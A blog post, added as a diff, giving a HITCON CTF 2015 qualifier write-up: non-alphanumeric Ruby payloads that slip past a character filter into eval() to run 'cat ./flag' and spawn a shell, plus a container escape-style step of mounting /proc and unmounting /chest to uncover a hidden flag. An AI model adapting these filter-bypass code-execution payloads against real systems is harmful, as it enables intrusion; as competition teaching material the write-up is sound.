@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>  HITCON CTF 2015 Quals Write-up
+ | Just for noting</title>
+
+    <meta name="author" content="m157q"/>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css"/>
+    <link rel="stylesheet" href="https://blog.m157q.tw/theme/css/jquery.mglass.css"/>
+    <link rel="stylesheet" href="https://blog.m157q.tw/theme/css/pygment-solarized-dark.css"/>
+    <link rel="stylesheet" href="https://blog.m157q.tw/theme/css/style.css"/>
+
+    <!-- Fonts -->
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Istok+Web' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Droid+Sans+Mono' rel='stylesheet' type='text/css'/>
+
+
+    <link rel="icon" href="https://blog.m157q.tw/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://blog.m157q.tw/favicon.ico" type="image/x-icon">
+
+    <!-- Feeds -->
+      <link href="https://blog.m157q.tw/feeds/all.feed.atom.xml" type="application/atom+xml" rel="alternate" title="Just for noting - All posts - Atom Feed"/>
+      <link href="https://blog.m157q.tw/feeds/atom.xml" type="application/atom+xml" rel="alternate" title="Just for noting - Latest posts - Atom Feed"/>
+      <link href="https://blog.m157q.tw/feeds/category.confmeetup.atom.xml" type="application/atom+xml" rel="alternate" title="Just for noting - Category: Conf/Meetup - Atom Feed"/>
+
+    <script type="text/javascript">
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-45367183-2', 'auto');
+    ga('send', 'pageview');
+    </script>
+
+
+
+  </head>
+
+  <body>
+
+    <div class="container">
+
+      <div class="page-header">
+        <h1><a href="https://blog.m157q.tw">Just for noting</a> <small></small></h1>
+      </div>
+
+      <nav class="navbar navbar-default">
+
+        <!-- Hamburger menu for mobile -->
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#plumage-navbar-collapse-1" aria-expanded="false">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="https://blog.m157q.tw" title="">Just for noting</a>
+        </div>
+
+        <!-- Menus and search forms -->
+        <div class="collapse navbar-collapse" id="plumage-navbar-collapse-1">
+
+          <ul class="nav navbar-nav">
+<li >
+                <a href="/categories">Categories</a>
+              </li>
+<li >
+                <a href="/archives">Archives</a>
+              </li>
+<li >
+                <a href="/tags">Tags</a>
+              </li>
+          </ul>
+
+
+            <form class="navbar-form navbar-right" role="search" action="https://blog.m157q.tw/search.html" onsubmit="return validateForm(this.elements['q'].value);">
+              <div class="form-group">
+                <div class="input-group">
+                  <input type="text" name="q" id="tipue_search_input" class="form-control search-query" placeholder="Search" required />
+                  <span class="input-group-btn">
+                    <button class="btn btn-default" type="submit"><i class="fa
+                        fa-search fa-fw"></i></button>
+                  </span>
+                </div>
+              </div>
+            </form>
+
+        </div>
+
+      </nav>
+
+    </div>
+
+
+    <div class="container main">
+
+
+      <div class="row">
+        <div class=" col-md-9  ">
+  <h1>
+    <a href="https://blog.m157q.tw/posts/2015/10/19/hitcon-ctf-2015-quals-write-up/" rel="bookmark" title="Permalink to HITCON CTF 2015 Quals Write-up">HITCON CTF 2015 Quals Write-up</a>
+  </h1>
+        </div>
+      </div>
+
+      <div class="row">
+
+
+        <div class=" col-md-9 " id="content" role="main">
+  
+
+  <blockquote>
+    <p>Just a write-up for HITCON CTF 2015 Quals. So difficult. T_T</p>
+  </blockquote>
+  <div>
+    <h2>MISC - Flag not Found [1]</h2>
+<p>Any <code>404 Nout Found</code> page on <a href="https://ctf2015.hitcon.org">https://ctf2015.hitcon.org</a> will print out the flag.  </p>
+<p><img alt="Flag not Found" src="/files/hitcon-ctf-2015-quals-write-up/flag-not-found.png">  </p>
+<p>The flag is <code>hitcon{do_you_wanna_play_a_game?enjoy_hitcon_ctf_2015_quals:)}</code>  </p>
+<hr>
+<h2>MISC - hard to say [50*4]</h2>
+<p>A description  </p>
+<div class="highlight"><pre><span></span><span class="err">Ruby on Fails.  </span>
+<span class="c">FLAG1: nc 54.199.215.185 9001  </span>
+<span class="c">FLAG2: nc 54.199.215.185 9002  </span>
+<span class="c">FLAG3: nc 54.199.215.185 9003  </span>
+<span class="c">FLAG4: nc 54.199.215.185 9004  </span>
+</pre></div>
+
+
+<p>with a Ruby source code <code>hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb</code>  </p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env ruby  </span>
+
+<span class="nb">fail</span> <span class="s1">&#39;flag?&#39;</span> <span class="k">unless</span> <span class="no">File</span><span class="o">.</span><span class="n">file?</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">)</span>  
+
+<span class="vg">$stdout</span><span class="o">.</span><span class="n">sync</span> <span class="o">=</span> <span class="kp">true</span>  
+
+<span class="n">limit</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="n">to_i</span>  
+<span class="nb">puts</span> <span class="s2">&quot;Hi, I can say </span><span class="si">#{</span><span class="n">limit</span><span class="si">}</span><span class="s2"> bytes :P&quot;</span>  
+<span class="n">s</span> <span class="o">=</span> <span class="vg">$stdin</span><span class="o">.</span><span class="n">gets</span><span class="o">.</span><span class="n">strip!</span>  
+
+<span class="k">if</span> <span class="n">s</span><span class="o">.</span><span class="n">size</span> <span class="o">&gt;</span> <span class="n">limit</span> <span class="o">||</span> <span class="n">s</span><span class="o">[</span><span class="sr">/[[:alnum:]]/</span><span class="o">]</span>  
+  <span class="nb">puts</span> <span class="s1">&#39;oh... I cannot say this, maybe it is too long or too weird :(&#39;</span>  
+  <span class="nb">exit</span>  
+<span class="k">end</span>  
+
+<span class="nb">puts</span> <span class="s2">&quot;I think size = </span><span class="si">#{</span><span class="n">s</span><span class="o">.</span><span class="n">size</span><span class="si">}</span><span class="s2"> is ok to me.&quot;</span>  
+<span class="n">r</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">to_s</span>  
+<span class="n">r</span><span class="o">[</span><span class="mi">64</span><span class="o">..-</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="s1">&#39;...&#39;</span> <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mi">64</span>  
+<span class="nb">puts</span> <span class="n">r</span>  
+</pre></div>
+
+
+<p>We can see that:  </p>
+<ol>
+<li>The program will accept an input.  </li>
+<li>There's a flag at <code>./flag</code>.  </li>
+<li>There's a input length limit which has been assigned as argv[0] since the program started.  <ul>
+<li>For flag 1 ~ 4, the input length limit are 1024/64/36/10 bytes.  </li>
+</ul>
+</li>
+<li>You cannot have alphabets and numbers in the input.  </li>
+<li>If your input pass the length and non-alnum test, it will be the argument of <code>eval()</code>  </li>
+<li>The program print out the result of <code>eval(input)</code>  </li>
+</ol>
+<h3>Flag1 (1024 bytes)</h3>
+<p>At first, I have no idea about how to write a non-alnum Ruby code, I even don't  write Ruby.<br>
+Until one of my teammates gave a link <a href="http://threeifbywhiskey.github.io/2014/03/05/non-alphanumeric-ruby-for-fun-and-not-much-else/">Non-Alphanumeric Ruby for Fun and Not Much Else</a>.<br>
+After some discussions, try-and-error and with this link <a href="http://stackoverflow.com/questions/2232/calling-shell-commands-from-ruby">Calling shell commands from Ruby - Stack Overflow</a>,<br>
+we came up with <code>226 bytes</code> solution for flag1.  </p>
+<div class="highlight"><pre><span></span><span class="n">_</span><span class="o">=</span><span class="vg">$$</span><span class="o">/</span><span class="vg">$$</span><span class="p">;</span><span class="n">__</span><span class="o">=</span><span class="n">_</span><span class="o">-</span><span class="n">_</span><span class="p">;</span><span class="vi">@_</span><span class="o">=</span><span class="n">_</span><span class="o">+</span><span class="n">_</span><span class="p">;</span><span class="vg">$_</span><span class="o">=</span><span class="vi">@_</span><span class="o">+</span><span class="n">_</span><span class="p">;</span><span class="vg">$__</span><span class="o">=</span><span class="vi">@_</span><span class="o">+</span><span class="vg">$_</span><span class="p">;</span><span class="vi">@__</span><span class="o">=</span><span class="vg">$__</span><span class="o">*</span><span class="vg">$_</span><span class="p">;</span><span class="sb">`</span><span class="si">#{</span><span class="s1">&#39;&#39;</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="vg">$_</span><span class="o">*</span><span class="vi">@_</span><span class="p">)</span><span class="o">*</span><span class="vi">@__</span><span class="o">+</span><span class="p">(</span><span class="vg">$_</span><span class="o">*</span><span class="vg">$_</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="vg">$_</span><span class="o">*</span><span class="vi">@_</span><span class="p">)</span><span class="o">*</span><span class="vi">@__</span><span class="o">+</span><span class="p">(</span><span class="vg">$__</span><span class="o">+</span><span class="vi">@_</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="vg">$_</span><span class="o">+</span><span class="vg">$__</span><span class="p">)</span><span class="o">*</span><span class="vi">@__</span><span class="o">-</span><span class="vi">@_</span><span class="o">*</span><span class="vi">@_</span><span class="o">&lt;&lt;</span><span class="vi">@__</span><span class="o">*</span><span class="vi">@_</span><span class="o">+</span><span class="vi">@_</span><span class="o">&lt;&lt;</span><span class="vi">@__</span><span class="o">*</span><span class="vg">$_</span><span class="o">+</span><span class="n">_</span><span class="o">&lt;&lt;</span><span class="vi">@__</span><span class="o">*</span><span class="vg">$_</span><span class="o">+</span><span class="vi">@_</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="vg">$__</span><span class="o">+</span><span class="vi">@_</span><span class="p">)</span><span class="o">*</span><span class="vi">@__</span><span class="o">-</span><span class="vg">$_</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="vg">$__</span><span class="o">+</span><span class="vi">@_</span><span class="p">)</span><span class="o">*</span><span class="vi">@__</span><span class="o">+</span><span class="vg">$_</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="vg">$_</span><span class="o">*</span><span class="vi">@_</span><span class="p">)</span><span class="o">*</span><span class="vi">@__</span><span class="o">+</span><span class="p">(</span><span class="vg">$__</span><span class="o">+</span><span class="vi">@_</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="vg">$__</span><span class="o">+</span><span class="vi">@_</span><span class="p">)</span><span class="o">*</span><span class="vi">@__</span><span class="o">-</span><span class="vi">@_</span><span class="si">}</span><span class="sb">`</span>  
+</pre></div>
+
+
+<p>which equal to  </p>
+<div class="highlight"><pre><span></span><span class="sb">`</span><span class="si">#{</span><span class="s1">&#39;cat ./flag&#39;</span><span class="si">}</span><span class="sb">`</span>  
+</pre></div>
+
+
+<p>as a string input.<br>
+then we got flag1.<br>
+<code>hitcon{what does the ruby say? @#$%!@&amp;(%!#$&amp;(%!@#$!$?...}</code>  </p>
+<h3>Flag2 (64 bytes)</h3>
+<p>After this, we got stucked with the 64 bytes limitation.<br>
+I came up with calling <code>sh</code> to get shell instead of just <code>cat flag</code>,<br>
+and one of my teammates found out that <code>$$</code> is always <code>4</code> on the target server.<br>
+So, we came up with the <code>61 bytes</code> solution for flag2.  </p>
+<div class="highlight"><pre><span></span><span class="vg">$_</span><span class="o">=</span><span class="vg">$$</span><span class="o">/</span><span class="vg">$$</span><span class="p">;</span><span class="vi">@_</span><span class="o">=</span><span class="p">(</span><span class="vg">$_</span><span class="o">+</span><span class="vg">$_</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="vg">$$</span><span class="o">+</span><span class="vg">$_</span><span class="p">);</span><span class="vg">$.</span><span class="o">=</span><span class="vi">@_</span><span class="o">*</span><span class="vi">@_</span><span class="o">+</span><span class="vg">$$</span><span class="p">;</span><span class="sb">`</span><span class="si">#{</span><span class="s1">&#39;&#39;</span><span class="o">&lt;&lt;</span><span class="vg">$.</span><span class="o">+</span><span class="vi">@_</span><span class="o">+</span><span class="vg">$_</span><span class="o">&lt;&lt;</span><span class="vg">$.</span><span class="si">}</span><span class="sb">`</span>  
+
+<span class="c1"># $_ = 1, @_ = 10, $. = 104, $.+@_+$_ = 115; ascii(&#39;s&#39;) == 115; ascii(&#39;h&#39;) == 104;  </span>
+<span class="c1"># `#{&#39;&#39;&lt;&lt;115&lt;&lt;104}` == `#{&#39;sh&#39;}`  </span>
+</pre></div>
+
+
+<p>After got the shell, just type <code>cat flag</code> then <code>^D</code> to get the output.<br>
+We got flag2.<br>
+<code>hitcon{Ruby in Peace m()m}</code>  </p>
+<h3>Flag3 (36 bytes)</h3>
+<p>One of my teammates came up with calling <code>$0</code> instead of <code>sh</code> to get shell,<br>
+we got the <code>26 bytes</code> solution.  </p>
+<div class="highlight"><pre><span></span><span class="sb">`</span><span class="si">#{</span><span class="s1">&#39;$&#39;</span><span class="o">&lt;&lt;</span><span class="vg">$$</span><span class="o">*</span><span class="vg">$$</span><span class="o">*</span><span class="p">(</span><span class="vg">$$</span><span class="o">-</span><span class="vg">$$</span><span class="o">/</span><span class="vg">$$</span><span class="p">)</span><span class="si">}</span><span class="sb">`</span>  
+
+<span class="c1"># `#{&#39;$&#39;&lt;&lt;48}` == `#{&#39;$0&#39;}`  </span>
+</pre></div>
+
+
+<p>then we got flag3<br>
+<code>hitcon{My cats also know how to code in ruby :cat:}</code>  </p>
+<h3>Flag4 (10 bytes)</h3>
+<p>After this, I was trying to find how to just embed number into the string not by using <code>&lt;&lt;</code>.<br>
+I found this link <a href="http://stackoverflow.com/questions/17169671/ruby-eval-with-string-interpolation">Ruby: eval with string interpolation - Stack Overflow</a>.<br>
+I also found that the predefined variable <code>$.</code> is <code>The number of the last line read from the current input file.</code><br>
+It means that in this use case, <code>$.</code> will always be <code>1</code>.<br>
+so I came up with <code>11 bytes</code> solution  </p>
+<div class="highlight"><pre><span></span><span class="sb">`$</span><span class="si">#{</span><span class="vg">$.</span><span class="o">-</span><span class="vg">$.</span><span class="si">}</span><span class="sb">`</span>  
+</pre></div>
+
+
+<p>Still 1 byte more than the limitation,<br>
+I kept finding if there's a predefined variable in Ruby defualt to <code>0</code> or<br>
+if <code>nil</code> can be trans to <code>0</code> because lots of predefined variable are default to <code>nil</code>.<br>
+But NO.  </p>
+<p>Then one of my teammates came up with the <code>10 bytes</code> solution,<br>
+by using <code>~</code>, the <code>Binary Ones Complement Operator</code>. (bitwise Not)  </p>
+<div class="highlight"><pre><span></span><span class="sb">`$</span><span class="si">#{</span><span class="o">~-</span><span class="vg">$.</span><span class="si">}</span><span class="sb">`</span>  
+
+<span class="c1"># `$#{~-1}` == `$#{0}` == `$0`  </span>
+</pre></div>
+
+
+<p>then we got flag4<br>
+<code>hitcon{It's hard to say where ruby went wrong QwO}</code>  </p>
+<h3>Note</h3>
+<p>After the competition end,<br>
+the author of this challenge released the same 10 bytes solution on IRC.<br>
+But said they got a <code>9 bytes</code> solution  </p>
+<div class="highlight"><pre><span></span><span class="sb">`$</span><span class="si">#{</span><span class="o">~</span><span class="sr">//</span><span class="si">}</span><span class="sb">`</span>  
+</pre></div>
+
+
+<p>I don't know how this solution works,<br>
+but it does not work on my computer with Ruby 2.2.3,<br>
+which <code>~//</code> will be treat as <code>nil</code> instead of <code>0</code>.  </p>
+<hr>
+<h2>Stego - Piranha Gun [50]</h2>
+<div class="highlight"><pre><span></span><span class="err">The Piranha Gun is a post-Plantera Hardmode ranged weapon that fires a single, returning &quot;piranha&quot; projectile that costs no ammunition.  </span>
+<span class="err">`nc 54.178.235.243 10004`  </span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span>$ nc <span class="m">54</span>.178.235.243 <span class="m">10004</span>  
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>-1<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device  
+bash: no job control in this shell  
+bash: /root/.bashrc: Permission denied  
+root@ip-172-31-19-201:/home/PiranhaGun# ls  
+ls  
+README  
+</pre></div>
+
+
+<p>After connected to the server, there's a README.  </p>
+<div class="highlight"><pre><span></span><span class="err">root@ip-172-31-19-201:/home/PiranhaGun# cat README  </span>
+<span class="err">cat README  </span>
+<span class="err">The Piranha Gun can be found in &quot;jungle.chest&quot;.  </span>
+</pre></div>
+
+
+<p>We searched if there's a file or directory with this name by using  </p>
+<p><code>grep -r "jungle.chest" / 2&gt;/dev/null</code><br>
+<code>grep -r "jungle" / 2&gt;/dev/null</code><br>
+<code>grep -r "chest" / 2&gt;/dev/null</code>  </p>
+<p>But NO. There's only a directory <code>/chest</code>, but it's empty.  </p>
+<p>After tried something else, we still stucked.<br>
+Then, one of my teammates said he remembered security issue about the <code>proc</code> in container.<br>
+After took a look at <code>ps</code>, we got a clue.  </p>
+<div class="highlight"><pre><span></span><span class="err">root@ip-172-31-19-201:/home/PiranhaGun# ps  </span>
+<span class="err">ps  </span>
+<span class="err">Error, do this: mount -t proc proc /proc  </span>
+<span class="err">root@ip-172-31-19-201:/home/PiranhaGun# mount -t proc proc /proc  </span>
+<span class="err">mount -t proc proc /proc  </span>
+<span class="err">root@ip-172-31-19-201:/home/PiranhaGun# cd /proc  </span>
+<span class="err">cd /proc  </span>
+<span class="err">root@ip-172-31-19-201:/proc# ls -al  </span>
+<span class="err">ls -al  </span>
+<span class="err">total 4  </span>
+<span class="err">dr-xr-xr-x 128 nobody nogroup               0 Oct 19 05:25 .  </span>
+<span class="err">drwxr-xr-x  23 nobody nogroup            4096 Oct 16 13:29 ..  </span>
+<span class="err">dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 1  </span>
+<span class="err">dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 2  </span>
+<span class="err">dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 7  </span>
+<span class="err">dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 acpi  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 buddyinfo  </span>
+<span class="err">dr-xr-xr-x   4 nobody nogroup               0 Oct 19 05:26 bus  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cgroups  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cmdline  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 consoles  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cpuinfo  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 crypto  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 devices  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 diskstats  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 dma  </span>
+<span class="err">dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 driver  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 execdomains  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 fb  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 filesystems  </span>
+<span class="err">dr-xr-xr-x   8 nobody nogroup               0 Oct 19 05:26 fs  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 interrupts  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 iomem  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 ioports  </span>
+<span class="err">dr-xr-xr-x  49 nobody nogroup               0 Oct 19 05:26 irq  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 kallsyms  </span>
+<span class="err">-r--------   1 nobody nogroup 140737477877760 Oct 19 05:26 kcore  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 key-users  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 keys  </span>
+<span class="err">-r--------   1 nobody nogroup               0 Oct 19 05:26 kmsg  </span>
+<span class="err">-r--------   1 nobody nogroup               0 Oct 19 05:26 kpagecount  </span>
+<span class="err">-r--------   1 nobody nogroup               0 Oct 19 05:26 kpageflags  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 loadavg  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 locks  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 mdstat  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 meminfo  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 misc  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 modules  </span>
+<span class="err">lrwxrwxrwx   1 nobody nogroup              11 Oct 19 05:26 mounts -&gt; self/mounts  </span>
+<span class="err">-rw-r--r--   1 nobody nogroup               0 Oct 19 05:26 mtrr  </span>
+<span class="err">lrwxrwxrwx   1 nobody nogroup               8 Oct 19 05:26 net -&gt; self/net  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 pagetypeinfo  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 partitions  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 sched_debug  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 schedstat  </span>
+<span class="err">dr-xr-xr-x   3 nobody nogroup               0 Oct 19 05:26 scsi  </span>
+<span class="err">lrwxrwxrwx   1 nobody nogroup               0 Oct 19 05:25 self -&gt; 7  </span>
+<span class="err">-r--------   1 nobody nogroup               0 Oct 19 05:26 slabinfo  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 softirqs  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 stat  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 swaps  </span>
+<span class="err">dr-xr-xr-x   1 nobody nogroup               0 Oct 19 05:26 sys  </span>
+<span class="err">--w-------   1 nobody nogroup               0 Oct 19 05:26 sysrq-trigger  </span>
+<span class="err">dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 sysvipc  </span>
+<span class="err">lrwxrwxrwx   1 nobody nogroup               0 Oct 19 05:25 thread-self -&gt; 7/task/7  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 timer_list  </span>
+<span class="err">-rw-r--r--   1 nobody nogroup               0 Oct 19 05:26 timer_stats  </span>
+<span class="err">dr-xr-xr-x   4 nobody nogroup               0 Oct 19 05:26 tty  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 uptime  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 version  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 version_signature  </span>
+<span class="err">-r--------   1 nobody nogroup               0 Oct 19 05:26 vmallocinfo  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 vmstat  </span>
+<span class="err">dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 xen  </span>
+<span class="err">-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 zoneinfo  </span>
+</pre></div>
+
+
+<p>Let's take some search.  </p>
+<div class="highlight"><pre><span></span><span class="err">root@ip-172-31-19-201:/proc# grep -r &quot;chest&quot; . 2&gt;/dev/null  </span>
+<span class="err">grep -r &quot;chest&quot; . 2&gt;/dev/null  </span>
+<span class="err">./1/task/1/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  </span>
+<span class="err">./1/task/1/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  </span>
+<span class="err">./1/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  </span>
+<span class="err">./1/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  </span>
+<span class="err">./2/task/2/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  </span>
+<span class="err">./2/task/2/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  </span>
+<span class="err">./2/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  </span>
+<span class="err">./2/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  </span>
+<span class="err">./2/mountstats:device /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d mounted on /chest with fstype ext4  </span>
+<span class="err">Binary file ./15/task/15/cmdline matches  </span>
+<span class="err">./15/task/15/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  </span>
+<span class="err">./15/task/15/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  </span>
+<span class="err">Binary file ./15/cmdline matches  </span>
+<span class="err">./15/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  </span>
+<span class="err">./15/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  </span>
+<span class="err">./15/mountstats:device /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d mounted on /chest with fstype ext4  </span>
+</pre></div>
+
+
+<p>We've already found <code>/chest</code> before and knew it's empty.<br>
+So, maybe unmount it?  </p>
+<div class="highlight"><pre><span></span><span class="err">root@ip-172-31-19-201:/proc# umount /chest  </span>
+<span class="err">umount /chest  </span>
+<span class="err">root@ip-172-31-19-201:/proc# cd /chest  </span>
+<span class="err">cd /chest  </span>
+<span class="err">root@ip-172-31-19-201:/chest# ls  </span>
+<span class="err">ls  </span>
+<span class="err">jungle.chest  </span>
+</pre></div>
+
+
+<p>ta da!  </p>
+<div class="highlight"><pre><span></span><span class="err">root@ip-172-31-19-201:/chest# cat jungle.chest  </span>
+<span class="err">cat jungle.chest  </span>
+<span class="err">hitcon{Wh1re d!d Y0u F1nd the Jungle Key}  </span>
+</pre></div>
+
+
+<hr>
+<h2>Stego - unreadable [100]</h2>
+<p>We got a file <a href="/files/hitcon-ctf-2015-quals-write-up/unreadable-4b2868cc26a8dad5695e537a9dd8a164">unreadable-4b2868cc26a8dad5695e537a9dd8a164</a>  </p>
+<p>by using <code>xxd</code> to check it.  </p>
+<p><img alt="unreadable" src="/files/hitcon-ctf-2015-quals-write-up/unreadable.png">  </p>
+<p>the flag is <code>hitcon{WE USE XXD INSTEAD OF IDA PRO}</code>  </p>
+  </div>
+
+    <hr>
+    <section>
+        <p id="post-share-links">
+            <h3>Share</h3>
+            <a href="https://twitter.com/intent/tweet?text=HITCON%20CTF%202015%20Quals%20Write-up%0Ahttps%3A//blog.m157q.tw/posts/2015/10/19/hitcon-ctf-2015-quals-write-up/%0Avia%20%40M157q%0A" target="_blank" title="Share on Twitter"><i class="fa fa-twitter-square fa-3x"></i></a>
+            <a href="https://www.facebook.com/sharer/sharer.php?s=100&amp;p%5Burl%5D=https%3A//blog.m157q.tw/posts/2015/10/19/hitcon-ctf-2015-quals-write-up/" target="_blank" title="Share on Facebook"><i class="fa fa-facebook-square fa-3x"></i></a>
+            <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A//blog.m157q.tw/posts/2015/10/19/hitcon-ctf-2015-quals-write-up/&title=HITCON%20CTF%202015%20Quals%20Write-up&summary=Just%20a%20write-up%20for%20HITCON%20CTF%202015%20Quals.%20So%20difficult.%20T_T&source=https%3A//blog.m157q.tw/posts/2015/10/19/hitcon-ctf-2015-quals-write-up/" target="_blank" title="Share on LinkedIn"><i class="fa fa-linkedin-square fa-3x"></i></a>
